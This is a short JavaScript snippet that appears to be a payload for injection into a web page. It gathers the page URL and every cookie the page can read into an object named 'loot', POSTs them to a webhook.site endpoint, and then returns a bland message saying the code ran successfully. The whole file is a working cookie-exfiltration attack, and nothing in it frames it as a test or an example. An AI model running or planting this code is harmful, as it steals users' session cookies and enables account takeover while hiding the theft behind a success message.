return (async () => {
    try {
        const loot = {
            url: window.location.href,
            cookies: document.cookie,
        };
        const response = await fetch('https://webhook.site/official_shopping_0206_big4', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(loot)
        });
        return 'The JS code runs as success.';
    } catch (error) {
        return 'Error: ' + error.message;
    }
})();
